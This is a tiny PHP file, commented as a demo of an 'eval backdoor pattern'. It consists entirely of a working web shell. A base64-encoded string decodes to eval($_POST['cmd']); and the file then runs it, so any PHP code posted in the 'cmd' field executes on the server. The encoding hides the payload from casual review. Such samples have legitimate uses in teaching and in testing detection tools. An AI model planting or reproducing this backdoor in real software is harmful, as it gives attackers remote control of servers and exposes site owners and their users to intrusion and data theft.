<?php
// Demo file: eval backdoor pattern
$code = base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=');
eval($code);
?>